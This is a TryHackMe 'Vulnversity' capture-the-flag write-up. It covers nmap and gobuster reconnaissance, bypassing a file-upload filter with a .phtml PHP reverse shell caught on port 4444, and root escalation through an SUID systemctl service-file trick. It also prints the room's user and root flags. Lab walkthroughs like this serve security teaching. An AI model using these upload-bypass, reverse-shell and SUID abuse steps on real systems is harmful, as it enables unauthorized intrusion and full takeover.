# Vulnversity

🔗 [Vulnversity](https://tryhackme.com/room/vulnversity)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.39.96`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

```bash
su
echo "10.10.39.96 vulnversity.thm" >> /etc/hosts

mkdir thm/vulnversity
cd thm/vulnversity

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 vulnversity.thm
```

```bash
PING vulnversity.thm (10.10.39.96) 56(84) bytes of data.
64 bytes from vulnversity.thm (10.10.39.96): icmp_seq=1 ttl=63 time=245 ms
64 bytes from vulnversity.thm (10.10.39.96): icmp_seq=2 ttl=63 time=99.3 ms
64 bytes from vulnversity.thm (10.10.39.96): icmp_seq=3 ttl=63 time=224 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

#### 2.1 - Scan the box; how many ports are open?

```bash
nmap --open -n -Pn -vvv vulnversity.thm
```

```bash
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3128/tcp open  squid-http   syn-ack ttl 63
3333/tcp open  dec-notes    syn-ack ttl 63
```

{% hint style="info" %}
6 ports are open
{% endhint %}

#### 2.2 - What version of the squid proxy is running on the machine?

```bash
3128/tcp open  squid-http   syn-ack ttl 63
```

Seeing last report scan, we see that squid-http is a service of tcp port 3128.

```bash
nmap -p3128 -sV -sC -n -Pn -vvv vulnversity.thm 
```

```bash
PORT     STATE SERVICE    REASON         VERSION
3128/tcp open  http-proxy syn-ack ttl 63 Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
```

{% hint style="info" %}
3.5.12 is the squid proxy version.
{% endhint %}

#### 2.3 - How many ports will Nmap scan if the flag -p-400 was used?

{% hint style="info" %}
400 ports
{% endhint %}

#### 2.4 - What is the most likely operating system this machine is running?

```bash
nmap -O -sV vulnversity.thm
```

```bash
Aggressive OS guesses: Linux 5.4 (99%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
Ubuntu
{% endhint %}

#### 2.5 - What port is the web server running on?

```bash
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

{% hint style="info" %}
Port 3333
{% endhint %}

2.6 - What is the flag for enabling verbose mode using Nmap?\


{% hint style="info" %}
\-v
{% endhint %}

### Task 3 - Locating directories using Gobuster

Using a fast directory discovery tool called `Gobuster`, you will locate a directory to which you can use to upload a shell.

Gobuster is a tool used to brute-force URIs (directories and files), DNS subdomains, and virtual host names.\


```bash
gobuster dir -u http://vulnversity.thm:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

#### 3.1 - What is the directory that has an upload form page?

```bash
2023/06/11 10:35:41 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 326] [--> http://vulnversity.thm:3333/images/]
/css                  (Status: 301) [Size: 323] [--> http://vulnversity.thm:3333/css/]
/js                   (Status: 301) [Size: 322] [--> http://vulnversity.thm:3333/js/]
/internal             (Status: 301) [Size: 328] [--> http://vulnversity.thm:3333/internal/]
```

{% hint style="info" %}
/internal/
{% endhint %}

### Task 4 - Compromise the Webserver

Now that you have found a form to upload files, we can leverage this to upload and execute our payload, which will lead to compromising the web server.

#### 4.1 - What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 11-38-38.png" alt=""><figcaption><p>Upload tentative of script.php</p></figcaption></figure>

{% hint style="info" %}
.php
{% endhint %}

We will fuzz the upload form to identify which extensions are not blocked.

To do this, we're going to use BurpSuite.

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 12-16-08.png" alt=""><figcaption><p>Capturing traffic</p></figcaption></figure>

We're going to use Intruder (used for automating customised attacks).

To begin, make a wordlist with the following extensions:

* .php
* .php3
* .php4
* .php5
* .phtml

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 12-17-57.png" alt=""><figcaption><p>Searching</p></figcaption></figure>

{% hint style="info" %}
.phtml
{% endhint %}

Now that we know what extension we can use for our payload, we can progress.

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and execute your shell, which will beacon out to you to control!

Download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

```bash
$ip = 'vulnversity.thm';
$port = 4444;  
```

#### 4.2 - What is the name of the user who manages the webserver?

```bash
listening on [any] 4444 ...
connect to [10.9.80.228] from (UNKNOWN) [10.10.114.236] 39004
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 14:05:44 up 46 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

```bash
$ ls home
bill
```

{% hint style="info" %}
bill
{% endhint %}

#### 4.3 - What is the user flag?

```bash
cd home/bill
ls -ah
.
..
.bash_logout
.bashrc
.profile
user.txt
```

```bash
cat user.txt
```

<details>

<summary>🚩Reveal Flag1 [user.txt]</summary>

8bd7992fbe8a6ad22a63361004cfcedb

</details>

### Task 5 - Privilege Escalation

Now that you have compromised this machine, we will escalate our privileges and become the superuser (root).

In Linux, SUID (**set owner userId upon execution)** is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

#### 5.1 - On the system, search for all SUID files. Which file stands out?

We can use the following command to list SUID files:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

```bash
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
```

/bin/systemctl stands out, at it is used to control and monitor services!

#### 5.2 - Become root and get the last flag (/root/root.txt)

We can use script of this website to became a root, in this case we choose systemctl process [https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/)\


```bash
sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c “chmod +s /bin/bash”
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

```bash
whoami
root
cat /root/root.txt
```

<details>

<summary>🚩Reveal Flag2 [root.txt]</summary>

a58ff8579f0a9270368d33a9966c7fd5

</details>



